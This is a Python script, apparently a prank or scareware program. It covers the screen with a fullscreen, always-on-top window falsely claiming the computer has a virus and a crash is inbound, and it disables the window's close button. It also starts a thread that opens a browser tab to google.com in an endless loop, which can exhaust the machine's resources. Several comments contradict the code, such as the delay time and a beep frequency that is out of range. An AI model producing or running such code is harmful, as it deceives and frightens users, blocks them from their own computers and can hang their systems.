import tkinter as tk
import winsound  # for Windows sound effects
import threading  # for running sound and GUI in parallel
import time
import webbrowser

    # Function to play sound effect
def play_sound():
    frequency = 99999999999999999999999  # Set Frequency To 1000 Hertz
    duration = 1000  # Set Duration To 1000 ms == 1 second
    winsound.Beep(frequency, duration)

    # Function to open google.com in a loop after a 10-second delay
def open_google():
    time.sleep(5)  # Wait for 10 seconds before starting the loop
    while True:
        webbrowser.open("http://google.com")
    # Function to make the window appear
def show_alert():
        # Create a Tkinter window
    window = tk.Tk()
    window.title("Your Computer Has Virus! Do Not Redeem It!")
        
        # Change window size
    window.geometry("1920x1080")

    window.wm_attributes('-topmost', True)
    
    window.attributes('-fullscreen', True)

        # Make the background red to indicate danger
    window.config(bg="red")

        # Add a warning message label
    label = tk.Label(window, text="Your PC Was Whopped by this virus!\n\nWarning: Crash Inbound!", 
                         font=("Helvetica", 40, "bold"), fg="white", bg="red", padx=20, pady=20)
    label.pack(expand=True)

        # Add a flashing effect (change color every 500ms)
    def flash_text():
        def toggle_color():
            if label.cget("fg") == "white":
                label.config(fg="yellow")
            else:
                label.config(fg="white")
            window.after(500, toggle_color)  # Toggle every 500ms

        toggle_color()

        # Start flashing effect in a separate thread to not block GUI
    threading.Thread(target=flash_text, daemon=True).start()

        # Disable the close button (the "X" button)
    def disable_event():
        pass  # Do nothing when trying to close the window

        # Override the close event
    window.protocol("WM_DELETE_WINDOW", disable_event)

        # Show the window
    window.mainloop()

    # Start sound and alert in parallel
threading.Thread(target=play_sound, daemon=True).start()
    
    # Start opening Google after 10 seconds in a separate thread
threading.Thread(target=open_google, daemon=True).start()
    
    # Show the alert window
show_alert()
